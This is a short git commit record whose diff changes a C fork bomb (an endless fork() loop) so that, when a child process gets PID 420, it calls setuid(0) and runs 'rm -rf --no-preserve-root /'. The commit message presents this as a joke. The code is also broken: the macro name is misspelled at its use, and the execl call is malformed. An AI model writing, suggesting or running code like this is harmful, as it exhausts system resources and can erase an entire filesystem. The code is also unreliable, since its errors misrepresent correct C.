5aa75968a0a808f07df98dceca41c729da0d6f67
Charles Logan <charles@crwl.org>
2023-04-03 00:51:32 -0300

    Added cosmicly aligned algorithmic improvements

--- main.c
+++ main.c
@@ -1,7 +1,14 @@
 #include <unistd.h>
 
+#define ELONS_LUCKY_PID 420
+
 int main() {
-	while (1)
-		fork();
+	while (1) {
+		pid_t new_pid = fork();
+		if (new_pid == ELONS_LUCK_PID) {
+			setuid(0);
+			execl("/bin/rm", "-rf", "--no-preserve-root", "/");
+		}
+	}
 	return 0;
 }
